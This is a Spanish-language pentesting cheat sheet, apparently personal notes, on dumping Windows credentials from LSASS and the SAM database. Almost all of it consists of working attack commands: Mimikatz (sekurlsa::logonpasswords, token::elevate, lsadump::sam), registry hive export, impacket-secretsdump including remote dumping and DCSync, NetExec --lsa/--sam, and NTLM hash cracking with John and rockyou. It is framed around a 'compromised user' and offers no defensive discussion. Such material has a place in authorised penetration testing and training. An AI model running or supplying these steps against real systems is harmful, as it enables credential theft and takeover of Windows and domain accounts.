# Dumpear la Lsass y SAM

Tags: #AD #LSASS #SAM #Mimikatz 

* [Logon Session - Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/logonsessions)

Este dumpeo se produce para obtener credenciales de los usuarios a nivel local pero puede que alguno de ellos tenga privilegios a nivel de dominio.

```powershell 
# Mirar los usuarios que pertenecen al grupo administradores de manera local 
❯ Get-LocalGroupMember -Group administradores  
```

```powershell
# Ejecutar como usuario admin
❯ .\logonsession.exe     # Mirar todas las 'logon sessions' que se han establecido en el equipo 

Cuando se observa un:
- 'Logon Type: Interactive' quiere decir que en el equipo en la memoria del LSA las credenciales están almacenadas 
- 'Logon Type: Network' quiere decir que es una sesión 'No interactiva' y que se ha hecho una autenticación a nivel de red por lo que las credenciales de autenticación no estarian almacenadas en el equipo
```

## Dumpear LSASS

### - Windows 

* [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919)

```bash 
Descargar mimikatz 'mimikatz_trunk.zip' desde el enlace de arriba y pasar '/mimikatz_trunk/x64/mimikatz.exe' a la máquina Windows con el usuario comprometido 
```

```powershell 
# Dumpear las credenciales con un usuario 'administrador' local 

❯ .\mimikatz.exe
	❯ sekurlsa::logonpasswords   # Dumpear todos los usuarios y hashes (NTLM) de todas las sesiones 
```

Otra forma de hacer el dumpeo de LSASS es obtener el archivo de volcado en Windows. Esto se hace en **Administrador de tareas** en **Detalles** y darle click derecho al proceso **lsass.exe** para seleccionar **Crear archivo de volcado**, después, dar click en **Abrir archivo de volcado** y pasar el archivo **lsass.DMP** a un Windows sin restricción para usar Mimikatz.

```powershell
❯ .\mimikatz.exe
	❯ sekurlsa::minidump C:\Users\user1\lsass.DMP
	❯ sekrulsa::logonpasswords
```
### - Kali 

```bash 
# Otra forma de hacerlo es usando Nextec con un usuario con permisos de 'administrador' remoto
❯ nxc smb IP -u user1 -p "password1" --lsa  
```

## Dumpear SAM 

### - Windows 

```powershell 
# Debemos ser usuario 'nt authority\system', por lo que se puede suplantar un 'acces token' utilizando un usuario 'administrador' local
❯ .\mimikatz.exe
	❯ privilege::debug 
	❯ token::elevate         # Suplantar el token de 'nt authority\system'
	❯ lsadump::sam           # Dumpear todos los usuarios y hashes (NTLM) de la DB local 
```
### - Kali 

```powershell
Otra forma de hacer el dumpeo de la SAM es obtener los siguientes archivos con un usuario 'administrador' local desde la máquina Windows y después pasarlos a Kali
❯ reg save hklm\sam sam.save 
❯ reg save hklm\system system.save 
```

```bash 
# Desde Kali se puede dumpear la SAM con los archivos obtenidos 
❯ impacket-secretsdump -sam sam.save -system system.save LOCAL 
```

```bash 
❯ impacket-secretsdump user1:password1@IP   # Solo se necesitan las credenciales validas del usuario con permisos de 'administrador' para hacer un DCSync o dumpear la SAM vía remoto
```

```bash 
# Otra forma de hacerlo es usando Nextec con un usuario con permisos de 'administrador' vía remota
❯ nxc smb IP -u user1 -p "password1" --sam
```

## Crackear el hash con John 

```bash 
❯ john --format=NT hash   # Crackear el hash para obtener la password 
❯ john --format=NT hash -w /usr/share/wordlist/rockyou.txt 
❯ john --format=NT hash --show   # Mirar la password 
```